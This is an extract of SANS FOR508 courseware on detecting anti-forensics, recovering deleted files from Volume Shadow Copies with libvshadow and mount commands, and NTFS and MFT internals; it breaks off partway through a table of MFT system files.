other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in
this Courseware are the sole property of their respective trademark/registered/copyright owners, including:
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My Mac, Boot Camp,
Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, iLife, iMac, iMessage, iPad, iPad Air, iPad Mini,
iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac,
Mac Logo, MacBook, MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina,
Safari, Siri, Spaces, Spotlight, There’s an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and
iCloud are registered trademarks of Apple Inc.
PMP® and PMBOK® are registered trademarks of PMI.
SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.
SIFT® is a registered trademark of Harbingers, LLC. Used with permission.
REMnux® is a registered trademark of Zeltser Security Crop. Used with permission.
VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered
trademarks of VMware, Inc. Used with permission.
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA.
Courseware licensed to User under this Agreement may be subject to export laws and regulations of the United States of
America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S.
Office of Foreign Assets Control within the U.S. Treasury Department (“OFAC”), or (ii) denied party list maintained by the U.S.
Bureau of Industry and Security within the U.S. Department of Commerce (“BIS”). User agrees to not allow access to any
Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulations.
User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and
recordkeeping required by OFAC, BIS or other governmental agency.
All reference links are operational in the browser-based delivery of the electronic workbook.
FOR508_5_I01_01

.

FOR508.5

Advanced Incident Response,Threat Hunting, and Digital Forensics

Advanced Adversary and
Anti-Forensics Detection

© 2023 SANS Institute | All Rights Reserved | Version I01_01

Welcome to Section 5.

Rob Lee
rlee@sans.org
https://twitter.com/robtlee
https://twitter.com/sansforensics

.

Author team:

Chad Tilbury
ctilbury@sans.org
https://twitter.com/chadtilbury
Mike Pilkington
mpilkington@sans.org
https://twitter.com/mikepilkington

© 2023 SANS Institute

.

1

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

2

© 2023 SANS Institute

.

2

FOR508 Intrusion Methodology Roadmap
1

2

3

Threat Hunting & Assessment
Collection and analysis at scale across the
enterprise. Begin identification and scoping.

Triage Collection & Analysis
Targeted data acquisition to validate findings
and develop threat intelligence.

Deep-Dive Forensics
In-depth analysis on systems and malware to
further identify tradecraft and build IOCs.

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

3

Your journey through FOR508 has been designed to follow a standard workflow for performing threat hunting,
compromise assessments, and incident response activities. The roadmap we will use in this class follows:

.

Threat Hunting & Assessment
We will start our process by looking at the network using tools that can scale collection and analysis, focusing
on occurrence stacking and outlier analysis. Most attendees have thousands of endpoints necessitating broad
scoping techniques at the start of an investigation.
Triage Collection & Analysis
As systems of interest are identified, we will perform targeted triage collection to acquire a deeper
understanding of attacker activity. Triage data can include traditional forensic artifacts like application
execution data, filesystem information, and in-memory artifacts such as process trees.
Deep-Dive Forensics
Finally, we will reserve our limited analyst time for performing deep-dive forensics on only a handful of
systems having the best chance to help us understand attacker tools and tradecraft and craft better indicators to
assist with scoping additional compromised systems.

© 2023 SANS Institute

.

3

Advanced Adversary and Anti-Forensics Detection Agenda

Anti-Forensics Overview
Recovery of Deleted Files via VSS
Advanced NTFS

Tactics

Advanced Evidence Recovery
Defensive Countermeasures
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

4

© 2023 SANS Institute

.

4

Common Types of Anti-Forensics Utilized

Filesystem
• Timestomping
• File Deletion
• File/Free Space Wiping
• Data Encryption (.rar
files)
• Fileless Malware (Not
artifact-less)

Registry
• Registry Key/Value
Deletion
• Registry Key/Value
Wiping
• Hiding Scripts in
Registry

Other
• Event Log
Deletion/Tampering
• Process Evasion Rootkits and Code
Injection

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

5

.

In this final major section of the class, we’re going to explore several deep-dive techniques that forensic analysts
can use to try to uncover any possible evidence of intrusion, or similar malicious behavior. In some situations,
recovering just a single artifact related to the investigation can mean that a system was compromised.
Conversely, using these deep-dive techniques and failing to find evidence of compromise may provide some
assurance that a particular system of interest should not be considered in-scope.
Attackers employ a variety of anti-forensics methods to cover their tracks. Their effectiveness is dependent on
several factors. In most cases, the general use of anti-forensic techniques is meant to help hide malware and
activity on a system but cannot fully destroy all references to files and artifacts on a Windows host. A major
factor on the effectiveness is often the passage of time. In many cases, the time to respond to an intrusion may
be the biggest factor as to whether or not we discover the malicious activity. As a result, if anti-forensics is done
properly, and it takes the IR team months to investigate the system, then the anti-forensics techniques will likely
be effective. Hence the need for organizations to constantly improve their detection, and response times.
In this slide we have summarized the most common ways attackers attempt to hide their activities. Some of
these topics we’ve discussed in class already, while the rest we will cover in the remaining sections.
Timestomping
One of the most used techniques by adversary groups is the timestomp capability. Timestomping backdates a
file to a time and date chosen by the adversary. They typically use this technique to make the file’s creation and
modification time similar to files that surround it in order to blend in.
File Delete/Wiping
File deletion and file wiping are techniques used by adversary teams to delete and overwrite malware, tools,
and/or exfil. While some living-off-the-land techniques do exist to overwrite data, most attackers use their C2
channel or download another tool (such as sdelete.exe) to perform the file wiping. While effective at overwriting
both the file’s data and metadata, it cannot overwrite the evidence that the file wiper was used. This leads to the
question, “What wipes the wiper?” The existence of a file wiping utility is evidence that the system was likely
compromised, and the anti-forensic techniques used by the attackers could be used as indicators of their attack.

© 2023 SANS Institute

.

5

Data Encryption
Attackers will commonly encrypt the contents of the files they are stealing. Commonly, the rar format is used, as
it is fairly impervious to breaking it if the encryption key (password) is complex.
Fileless Malware
Recently, attackers have employed techniques that do not directly use malicious executables or DLLs residing
on the host. These techniques often use a PowerShell script to execute, which may reside in a malicious
document, the registry, or the WMI database. While these techniques do not use a malicious executable to run,
they are far from being silent on a host. Through proper logging, the suspicious activity can be detected and the
contents of the scripts themselves extracted.
Registry Key/Value Deletion/Wiping
The registry hive files are simply databases. As a result, once a key/value is added to a registry hive file, it is
challenging to fully remove. The keys/values will persist for a time and are often recoverable. If an adversary
attempts to overwrite the keys/values, this is possible and might mitigate the existence of the data in the registry,
but fortunately the Windows operating system goes to great lengths to back up the registry hive files.
Hiding Data in the Registry
Many attackers are attempting to use fileless malware techniques to remove the presence of an executable file
on the file system. As a result, they have used registry key locations to store very large values that contain
scripts. These locations in the registry are often obfuscated or encrypted. However, these scripts tend to stick out
due to their size and structure.

.

Event Log Deletion/Tampering
For years, attackers have simply “cleared” the event logs. In many environments, this is still extremely effective
and not uncommon for threat groups. When dealing with more advanced adversaries, it is possible for them to
suspend or otherwise manipulate the event logs as well. In either case, organizations should protect their logs
by forwarding them into a central log management system. Additionally, forensics techniques exist to
potentially recover logs that were deleted from the system. We will look at one of those techniques next.

6

© 2023 SANS Institute

.

Advanced Adversary and Anti-Forensics Detection Agenda

Anti-Forensics Overview
Recovery of Deleted Files via VSS
Advanced NTFS
S Filesystem Tactics
Advanced Evidence Recovery
Defensive Countermeasures
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

7

.

This page intentionally left blank.

© 2023 SANS Institute

.

7

Recovery of Deleted Files via VSS
Volume Shadow Copies

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

8

© 2023 SANS Institute

.

8

Evidence of Historical Data

Volume Shadow Copies
• Can provide backups of nearly the
entire volume to earlier points in
time
• Similar to virtual machine snapshots
• Recover key files (event logs, registry,
malware, even wiped files)
• Introduction of “ScopeSnapshots” in
Windows 8+ limits effectiveness
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

9

.

In many situations, attackers and suspects will attempt to scrub their presence from a system. For example, the
use of file and free space wipers are often seen by some of the more advanced groups to hide their activities and
capabilities. If adversaries use a local system privilege escalation tool, they might consider wiping it so that
responders will not discover it. In addition, adversaries often wipe the archive files (e.g., .rar archives) on the
system they exfiltrated them from. This would prevent a responder from finding them and discovering what was
stolen (assuming they can also be unencrypted).
Fortunately, these files might not be permanently lost. With the existence of System Restore points in Windows
XP and prior, and then its more evolved cousin that utilizes the Volume Shadow Copy Service (VSS/VSC), it’s
possible to recover some of the cleared data by examining evidence of historical artifacts from earlier snapshots.
Windows XP restore points are created from various activities, including application installation, Windows
updates, and driver installation.[1] These triggers cause the backup of key system files which include
executables, DLLS, drivers, and registry files.[2][3] From an IR standpoint, malware regularly gets caught up in
this process as well. In fact, for those who recall working with Windows XP to eliminate malware infections,
you’ll remember cleanup guidance often called for temporarily disabling System Restore to allow AV to scan
restore points to eliminate backed up malware.[4] While restoring backed up malware is not ideal for end users,
it’s exactly the capability we want as forensic analysts!
Beginning with Vista and Server 2008, both the System Restore and Previous Versions functionality began to
leverage persistent snapshots from the Volume Shadow Copy Service, providing an even more robust capability
to back up nearly the entire volume. By default, only a few files and folders have been excluded. Those
exclusions are found in a registry key at
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot. This
exclusion list is fortunately a very short list. However, it should also be noted that in at least some versions of
Windows, the hibernation file and page file is also not tracked by the Volume Shadow Copy Service driver, so
those files may also be excluded.[5] That said, the experience of many analysts suggests that these important
files can still be included in some cases, so their exclusion should not be taken for granted.
The Volume Shadow Copy Service is leveraged by numerous features within Windows, including System
Restore and Previous Versions. When storing persistent snapshots, the service works by monitoring any writes
© 2023 SANS Institute

.

9

to the file system and first making a backup copy of data blocks before writing new data to the disk. This is a
common copy-on-write (COW) technique to efficiently store just data differences. The backed-up blocks are
stored in 16 KB chunks in files stored in the “System Volume Information” directory at the root of the volume.
That directory will include a file that tracks each active volume shadow copy, with information such as the VSC
ID and timestamp it was created. This tracking file is called the catalog and its name is in the format of a GUID,
which typically is the following value/filename: {3808876b-c176-4e48-b7ae-04046e6cc752}. For each active
volume shadow copy, there is a store file that keeps all the backed up 16 KB data blocks. These files are named
with a new unique GUID, followed by the GUID of the catalog file (e.g., “{08bf868a-b118-11e8-a902a2c6c7001600}{3808876b-c176-4e48-b7ae-04046e6cc752}”). Through this process, the Volume Shadow
Copy service essentially provides the ability to rewind a file, a directory, in fact nearly the entire volume to a
previous state. Wonderful for forensics!
Besides the exclusions previously discussed, it should also be noted that Window 8 introduced a feature called
ScopeSnapshots which can have a significant impact on the forensic usefulness of volume shadow copies. This
feature is now enabled by default in recent versions of Windows client operating systems (Windows 8, 8.1, 10,
and 11). When ScopeSnapshots are enabled, volume snapshots will “monitor files in the boot volume that are
relevant for system restore only”. [6] In other words, when enabled, the volume snapshots are more akin to the
old Windows XP restore points than the near full-volume snapshots that were enabled on Windows 7. This
significantly degrades our ability to recover files and folders that are not deemed to be important for system
restore. An excellent white paper titled “VSS Does Not Protect User Data” from Mamoru Saito describes this
issue in detail.[7] His testing shows examples of files from a user’s desktop recovered from volume shadow
copies which were corrupted in many cases due to ScopeSnapshots. On the plus side, the testing also indicates
that Windows Server platforms still use the more complete volume shadow service functionality, and therefore
nearly complete volume backups are available in the server snapshots. Furthermore, there is an available
registry setting that can be configured to disable ScopeSnapshots on client systems. According to Microsoft
documentation, it can be disabled by creating a registry DWORD value called “ScopeSnapshots” in
HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore and setting it to 0.

.

[1] What is System Restore?: https://for508.com/a8que
[2] Legacy System Restore Reference: https://for508.com/3ryzq
[3] Monitored File Name Extensions: https://for508.com/e9c35
[4] Example of disabling XP restore points for virus removal: https://for508.com/d3jte
[5] See page 180 of Windows® Internals, Sixth Edition, Part 2 by Russinovich, Solomon, and Ionescu
[6] Calling SRSetRestorePoint: https://for508.com/thuiq
[7] “VSS Does Not Protect User Data” whitepaper: https://for508.com/av4fl

10

© 2023 SANS Institute

.

Volume Shadow Examination

• Several live-triage and
dead-box analysis tools
support VSCs
• Full-volume forensic
images can be analyzed on
non-Windows systems
• We will use the libvshadow
toolset on Linux SIFT VM
• vshadowinfo
• vshadowmount

Analysis Option s
Triage Analysis
• KAPE
• Velociraptor
Full-Volume Analysis
• Arsenal Image Mounter
• F-Response
• vshadowmount

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

11

Volume shadow copies have the potential to be a serious game changer in your investigation. Files that have
been wiped, actions that were captured in event logs (which the attacker later deleted), and file system journals
showing files being renamed or moved, are just a few of the examples of compelling evidence than can be
captured and restored from volume shadow snapshots.[1]

.

So, you may ask, how can we access this data for forensics? Fortunately, we have several options. Several
incident response and triage tools have the ability to access volume shadow copies on the live file system. This
is important because rapid analysis usually precludes the ability to capture full disk images. So, when triage
tools have the capability of accessing shadow copies, we are armed with the ability to quickly mine the most
useful forensic artifacts over a longer timeframe. Tools we’ve already discussed like KAPE and Velociraptor
have this ability. In the case of KAPE, it also includes the ability to deduplicate data to minimize extraneous
collections. And with Velociraptor’s ability to scale to thousands of systems, we have significant visibility to
scope intrusions across a longer timeframe.
That said, in this section we are focusing on the lowest levels of forensic analysis, typically reserved for critical
systems such as “patient 0”, or the C-level executive whose machine was the ultimate target of an attacker. For
these systems, we often acquire a full disk image to ensure we have access to all available forensic evidence. In
these cases, we have options to access everything available in VSCs through at least a couple of different
techniques. One technique is to essentially trick Windows into believing that a disk image is a real drive. In
that case, Windows will automatically unwind any available volume shadow copies on the image. An excellent
tool that provides this ability on Windows is Arsenal Image Mounter.[2] It uses a driver to cause the disk image
to emulate a physical SCSI drive. The tool includes additional features when a licensed copy is purchased, but
the free unlicensed version does an excellent job of presenting a disk image as a real disk to Windows. This
exposes not only volume shadow copies, but also BitLocker and other drive encryption technologies as well.
Once Windows believes a disk image is a real disk, it can natively expose the VSCs and a tool such as Shadow
Explorer makes it easy to recover previous versions of files.[3]
When the need arises to access volume shadow copies without relying on Windows, we are fortunate to have a
library from Joachim Metz named libvshadow, and the associated tools, vshadowinfo and vshadowmount.[4]
This fantastic free tool set has the capability to parse and expose volume shadow snapshots as additional raw

© 2023 SANS Institute

.

11

disk images. Next, we explore their capabilities and describe several analysis methods that will likely change
the way you approach volume shadow analysis.

.

[1] Volume Shadow Copy Service: https://for508.com/cudsy
[2] Arsenal Image Mounter: https://for508.com/95wr6
[3] Shadow Explorer: https://for508.com/cz9fo
[4] libvshadow on GitHub: https://for508.com/apvox

12

© 2023 SANS Institute

.

List Available Snapshots vshadowinfo
• vshadowinfo from the libvshadow project by Joachim Metz

• List all available shadow snapshots in a disk image
vshadowinfo [ -o offset ] source
Store: 1
Identifier
Shadow copy set ID
Creation time
Shadow copy ID
Volume size
Attribute flags

(NOTE: <source> must be raw disk)

: d840ed03-ac5b-11e8-a902-a2c6c7001600
: 839ad38d-d320-44c4-9203-0f58e37973b4
: Sep 01, 2018 13:53:11.906321000 UTC
: 8362ab5e-f570-45e8-a3f3-a456fee36191
: 31 GiB (33833353216 bytes)
: 0x0042000d

Store: 2
Identifier
: 08bf868a-b118-11e8-a902-a2c6c7001600
Shadow copy set ID
: 41b9a105-e696-48e6-bd38-1b346d59f1f6
Creation time
: Sep 05, 2018 20:53:08.570164000 UTC
Shadow copy ID
: 2d266acc-a4ca-4443-bb11-1c07eba21252
Volume size
: 31 GiB (33833353216 bytes)
Attribute flags FOR508: | 0x0002001d
Advanced Incident Response, Threat Hunting, and Digital Forensics

13

The first tool we use from the libvshadow project has capability based on the Windows built-in command
“vssadmin list shadows”. If you run that command at a Windows command prompt with Administrator
rights, it will list any persistent volume shadow copies currently available on the host.

.

The equivalent command with the libvshadow toolset is vshadowinfo. When you point vshadowinfo at a raw
disk image (it cannot be an E01 image), it will list out each volume snapshot and the date/time it was created on
the source system.
If you are attempting to parse the volume shadows of a physical disk image, rather than the logical volume
image (as we have with the SRL “c-drive” images), the –o offset option should be used to point to the
appropriate disk offset where the NTFS volume begins.

© 2023 SANS Institute

.

13

Shadow Copy Mounting: vshadowmount
vshadowmount [ -o offset ] source /mnt/vss

(NOTE: <source> must be raw disk)

# ewfmount rd01-cdrive.E01 /mnt/ewf_mount/
# vshadowmount /mnt/ewf_mount/ewf1 /mnt/vss/
# cd /mnt/vss/
# ls

• vss1

vss2

# mount -o ro,show_sys_files,streams_interface=windows vss2 /mnt/shadow_mount/vss2
# cd /mnt/shadow_mount/vss2/
# ls

• $AttrDef
• autoexec.bat
• $BadClus
• $Bitmap
• Boot
• $Boot
• bootmgr

BOOTSECT.BAK
config.sys
Documents and Settings
$Extend
$LogFile
$MFTMirr
MSOCache

pagefile.sys
PerfLogs
ProgramData
Program Files
Recovery
$Recycle.Bin
$Secure

System Volume Information
$UpCase
Users
$Volume
Windows

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

The next tool from the libvshadow toolset provides the capability to expose all the volume shadow copies as raw
disk images so that we can analyze them in the SIFT workstation. The process will first use the command
vshadowmount to expose the volume shadows copies.

.

In the example above, we’ve taken a preliminary step to expose the compressed E01 image as a raw disk image
into the /mnt/ewf_mount directory. This step uses a tool called ewfmount, which is not part of libvshadow
project, but comes from the same author, Joachim Metz. This step is necessary because the libvshadow tools
require a raw disk image. After running ewfmount, it will present a file named ewf1. This is not an actual file,
but rather a virtual representation of the raw disk image contained inside the compressed E01 file. We use
vshadowmount on this ewf1 file to provide additional disk image representations. In the example above, there
were 2 volume shadow copies (as shown on the previous slide), and they are now exposed as vss1 and vss2. A
final step mounts one of the volume shadow copy images (vss2) as an NTFS file system using the Linux mount
command.
# ewfmount rd01-cdrive.E01 /mnt/ewf_mount/
# vshadowmount /mnt/ewf_mount/ewf1 /mnt/vss/
# cd /mnt/vss/
# ls
# mount -o ro,show_sys_files,streams_interface=windows vss2
/mnt/shadow_mount/vss2
# cd /mnt/shadow_mount/vss2/
# ls

14

© 2023 SANS Institute

.

14

$AttrDef
Information
autoexec.bat
$BadClus
$Bitmap
Boot
$Boot
bootmgr

BOOTSECT.BAK

pagefile.sys

System Volume

config.sys
Documents and Settings
$Extend
$LogFile
$MFTMirr
MSOCache

PerfLogs
ProgramData
Program Files
Recovery
$Recycle.Bin
$Secure

$UpCase
Users
$Volume
Windows

Note that we have an alias in the Linux SIFT called “mountwin” which can be used in place of the full mount
command with all the options shown above. Here’s the alias definition:
# alias mountwin
alias mountwin='mount -o ro,show_sys_files,streams_interface=windows’
For reference, here are the meanings of the options used with the mount command:[1]
ro Mount the file system as read-only
show_sys_files Show hidden system files such as $LogFile, $Bitmap, etc.
streams_interface=windows Expose alternate data streams

.

[1] Matt Bromiley provided a nice list of mount options in “Torvalds Tuesday: Mount Up!”:
https://for508.com/1w7j3

© 2023 SANS Institute

.

15

Case Study: Mount and Search All Shadow Copies
Step 1: Mount disk image
• # ewfmount rd01-cdrive.E01 /mnt/ewf_mount/

Step 2: Expose volume snapshots
• # vshadowmount /mnt/ewf_mount/ewf1 /mnt/vss/

Step 3: Mount all snapshots as logical file systems via a FOR loop
• # cd /mnt/vss
• # for i in vss*; do mount -o ro,show_sys_files,streams_interface=windows $i

/mnt/shadow_mount/$i; done

Step 4: Search mounted snapshots
• # cd /mnt/shadow_mount
• # find . | grep -i <filename>

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Mounting multiple volumne shadow copies is easy with the inclusion of a FOR loop to auto-mount all available
snapshots. To prepare for execution of this loop, the folder /mnt/shadow_mount must be pre-populated
with as many sub-folders as you expect to have mounted snapshots (e.g. /mnt/shadow_mount/vss1;
/mnt/shadow_mount/vss2). This has already been accomplished for you within the SIFT workstation.

.

Once all shadow copies are mounted, they can be searched for files and folders of interest. In this example, we
use a simple Linux find command to iterate recursively through each folder, returning the full path of any files
matching the grep filter. This is an easy way to search for specific file types or file names relevant to an
investigation.
Step 1: Mount disk image
# ewfmount rd01-cdrive.E01 /mnt/ewf_mount/
Step 2: Expose volume snapshots
# vshadowmount /mnt/ewf_mount/ewf1 /mnt/vss/
Step 3: Mount all snapshots as logical file systems with the use of a FOR loop
# cd /mnt/vss
# for i in vss*; do mount -o ro,show_sys_files,streams_interface=windows $i
/mnt/shadow_mount/$i; done
Step 4: Search mounted snapshots
# cd /mnt/shadow_mount
# find . | grep -i <filename>

16

© 2023 SANS Institute

.

16

VSS Examination with log2timeline.py

Run log2timeline Across VSS Snapshots
• # log2timeline.py --storage-file plaso.dump disk.img

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

17

The log2timeline.py tool has built-in capability to recognize volume shadow snapshots when run against a
full disk or volume images. In this case, log2timeline will prompt the analyst about whether to include
snapshots, and if so, which ones. There is full flexibility to choose none, one, several, or all snapshots, as shown
in the screenshot above.

.

Furthermore, the psort post-processing tool has built-in capability to deduplicate entries. This is incredibly
useful for VSS analysis due to the high occurrence of duplicate data across snapshots. From the plaso project’s
documentation, it notes the following about psort deduplication:[1]
psort records the number of events it processes and how many events got filtered out due to filter settings or to
duplication removals.
There are many reasons why there may be duplicate entries in an output:
• A filesystem entry that has the same timestamp for MACB timestamps (or any combination of them)
• Parsing a storage media file and processing a VSS store will produce a lot of duplicate entries, for example:
the exact same Event Log record.
• Metadata information extracted from a file that is stored in more than one place on the drive
[1] Using psort.py: https://for508.com/m3d1f

© 2023 SANS Institute

.

17

Lab 5.1
Mount and Examine VSS Images
Average Time: 20 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

18

© 2023 SANS Institute

.

18

Optional Homework
Lab 5.2
VSS Super Timeline Creation

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

19

.

This page intentionally left blank.

© 2023 SANS Institute

.

19

Advanced Adversary and Anti-Forensics Detection Agenda

Anti -Forensics Overview
Recovery of Deleted Files via VSS
Advanced NTFS Filesystem Tactics
Advanced Evidence Recovery
Defensive Countermeasures
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

20

© 2023 SANS Institute

.

20

Advanced NTFS Filesystem
Tactics

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

21

•
•
•
•
•
•
•
•
•

.

In 1989, Microsoft and IBM partnered on a new operating system called OS/2 that would be more feature-rich
than DOS. While this OS failed to catch on, several of the groundbreaking technologies developed for it were
later incorporated into Windows NT. One of those features was OS/2’s file system, High Performance File
System (HPFS). HPFS morphed into NTFS and was specifically designed to overcome all the shortcomings of
FAT and be applicable in an enterprise environment. It included features such as:
Support for mixed-case filenames, in different code pages
Support for long filenames (255 characters as opposed to FAT's 8+3 characters)
Less fragmentation of data
Extent-based space allocation
Transaction journaling for crash recovery
B+ tree structure for directories
Support for compression, encryption, and quota enforcement at the file system layer
Support for sparse files, soft links, and hard links
POSIX support

The default cluster size for FAT could quickly grow to 64KB, which led to a lot of wasted space as slack when
saving small files. To overcome this, NTFS was designed to keep the cluster size at 4KB for as large a volume
as possible. The format command will default to 4KB clusters, but this can be overridden to different sizes if
desired.[1]
Versions:
v1.0 released with NT 3.1 in mid-1993
v1.1 released with NT 3.5 in fall 1994
v1.2 released with NT 3.51 in mid-1995
v3.0 released with Windows in 2000
v3.1 released with Windows XP in autumn 2001
The most significant change was with version 1.2. The next most significant changes to the on-disk structure of
NTFS occurred with the release of v3.1, when an extra field was added to the MFT record to explicitly state
what record number it was (the entry number).
© 2023 SANS Institute

.

21

Note: There is a difference between the on-disk format version and a version of the NTFS.sys driver that
Windows uses to load the filesystem. Unfortunately, a lot of marketing material, books, white papers, and so on
don’t differentiate to which they are referring, leading to references to NTFS v4, v5, and v5.1. These are
actually references to the driver version number and the new features that it supports, not to new changes to the
on-disk format.

.

[1] Default cluster size for NTFS, FAT, and exFAT: http://for508.com/uonq-

22

© 2023 SANS Institute

.

NTFS Features

Journaling

Change
tracking

Hard links

Soft links

Sparse file
support

Access
control lists

Disk usage
quotas

Reparse
points

Distributed
link tracking

Encryption
(EFS)

Compression

Volume
shadow
copy

Alternate
data
streams

Volume
mount
points

Single
instance
storage

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

23

Wow! NTFS has a LOT of features. The important thing to remember is that NTFS was designed to be a robust
and feature-full filesystem that can do A LOT more than FAT. Many of these features are only applicable in an
enterprise environment, and even then, many features aren’t even fully in use in those environments. Some
interesting highlights include:

.

• NTFS makes use of a log file to record changes to the metadata to track the state and integrity of the
filesystem at all times. This also allows correcting inconsistencies caused by system crashes. Other
filesystems call this “journaling”, whereas NTFS calls it “transaction logging”.
• NTFS is able to track all the files that have changed on the system via a USN (Update Sequence Number)
Journal or Change Journal. This allows programs like a backup utility or virus scanner to know what files are
new or changed since they last ran.
• POSIX compliance requires NTFS to support hard links and soft links. A hard link is when a single file
responds to multiple names. At the user level, you see two files, but you are really only interacting with one.
A soft link is where a second file is created but doesn’t have any data. Instead, it is just an alias or pointer to
another file, and opening it actually opens the other file’s data without telling you.
• NTFS has incredibly robust security controls to prevent users from opening files they aren’t allowed to. (Of
course, that can all be bypassed by mounting the drive in Linux or using forensic tools, but that is a whole
other discussion.)
• NTFS allows administrators to limit users to a specific amount of disk space they are allowed to consume.
No matter which folder they write to, the filesystem will track all the files a user owns and will stop them if
they are using too much space.
• Reparse points allow the system to interact with files in all kinds of exciting ways. Soft links, volume mount
points, and single instance storage are all implemented via reparse points, just to name a few. Anyone can
program a filesystem filter driver and create their own reparse points that do whatever they want them to do.
• NTFS uses Object IDs to track certain files, so that no matter where you move a file or how many times you
rename it, the distributed link tracking system will update all the links to the file so that you never lose it.
© 2023 SANS Institute

.

23

• NTFS implemented file-level encryption at the filesystem level so that it operates completely transparent to
you as the user but makes it difficult for others to read your files.
• NTFS implemented file-level compression at the filesystem level so that it operates completely transparent
to you as the user but saves you considerable disk space.
• NTFS keeps backups of your files as you modify them via the Volume Shadow Copy feature. Did you just
delete large parts of a file, press “Save”, and then realize that you meant to press “Save As”? You may be in
luck! Depending on timing and the OS configuration, you may be able to recover a previous version of the
file from a volume shadow copy.
• NTFS allows files to have alternate content! For instance, files downloaded from the Internet are tagged so
that Windows can warn you before executing them. While this is one of many examples showing how
alternate data streams are used legitimately, bad guys also use them as a way to hide data in an attempt to be
sneaky.
• NTFS allows you to mount another drive as a folder on the current drive, so instead of having a C: and D:
you can have a C: and a C:\data. This is very useful for keeping your directory tree organized while still
benefiting from the increased speed and volume size by spreading your data across multiple drives.

.

• NTFS can save disk space on large servers by keeping only one instance of a file. For example, I send a
300GB video of this class to every student in this class, and you all save it on your profile directory on the
corporate file server. Dozens of copies * 300GB = a very full file server! Single Instance Storage allows
NTFS to reclaim that disk space by converting all those copies into a single copy, plus a bunch of small soft
links that point to that single copy, all under the hood without any of you knowing it was happening.

24

© 2023 SANS Institute

.

Metadata Layer Master File Table: MFT
Analysis

• The Metadata layer contains data
that describe files
• Acts like a card catalog in a library
• Contains pointers to:
• Data layer for file content
• MAC times
• Permissions

• Each metadata structure is given a
numeric address
• The MFT is the Metadata Catalog for NTFS
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

25

hi

de

Typical file systems store virtually all data in files. The most important of these is a set of special files which are
generically referred to as the file system’s metadata structure. The prefix "meta-" means self-referring. So
"metadata structures” are structures that contain data about data. And that's exactly what these structures do.
They contain internal information about the real data stored on the file system.
The structures contain information about files and directories such as modified, accessed, and created
timestamps; permissions; ownership; file size; and pointers to where the file data is stored in the volume. The
mechanics used to store the clusters allocated to a file differ depending on the file system, but in general, each
file system tracks a list of cluster addresses that can be followed in order to reconstruct the contents of a file.
NTFS uses the concept of a “data run”, while FAT tracks a “chain” of clusters.
In NTFS, the Master File Table (MFT) is the core metadata structure of the file system. It is a very structured
database that stores “MFT entries”—also referred to as “MFT records”—for every file and folder on the
volume. An MFT entry for a file contains the critical information needed to fully describe the file, or in some
cases provides pointers to other locations in the volume to get that information.

© 2023 SANS Institute

.

25

Metadata Layer Data Types Inside an MFT Entry
Analysis
Clusters tracked in $Bitmap
MFT entries stored in $MFT

MFT Entry
File info

Timestamps

Metadata
change

Creation

Modified

Accessed

Name

Size

Type

Security

Link
count

Data

Cluster
list

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Here we see a generic representation of an MFT entry for a “non-resident” file, meaning that the data is stored
in clusters on the volume rather than in the MFT entry itself. Each of the files and directories in NTFS will have
at least one (and usually just one) MFT entry similar to the example above. All MFT entries together are stored
in a single hidden file called the “$MFT”. As is the case with most file systems, critical information about each
file and directory is stored in metadata entries such as this. Some of that critical information includes the file or
directory name, timestamps, permissions, and a pointer to the actual data, if non-resident. If this were a resident
file, the data would be stored in the remaining space of the MFT entry. This typically only happens for files that
are about 600 bytes or less.
When the data is stored in clusters, the file system has to track which clusters are available and which are in use.
NTFS does this with a hidden file called the “$Bitmap”. This file will maintain a single bit to represent each
cluster on the volume, allowing it to mark if the cluster is allocated (in use) or unallocated (not in use). In the
example above, the file’s data is stored in four clusters (12, 13,14, and 17). Notice that this represents a
fragmented file, since there’s a sequential gap in the clusters belonging to the file. Windows is typically good at
keeping files’ clusters contiguous for better efficiency. So, this would be an anomaly, but certainly happens.
In addition to the $MFT and the $Bitmap, NTFS uses several other system files to maintain the file system.
What follows is a list of the system files and their purpose. Also shown is a table with a brief description of
each file and a column for the reserved MFT entry for each. NTFS reserves the first 24 entries for special use,
and the first 12 entries are used by these system files. Almost all of these files start with a $ and are hidden from
view unless using specialized tools (entry 5 being the exception).

26

© 2023 SANS Institute

.

26

MFT Record # Filename

Description

0

$MFT

Master File Table - A database that tracks every file in the volume

1

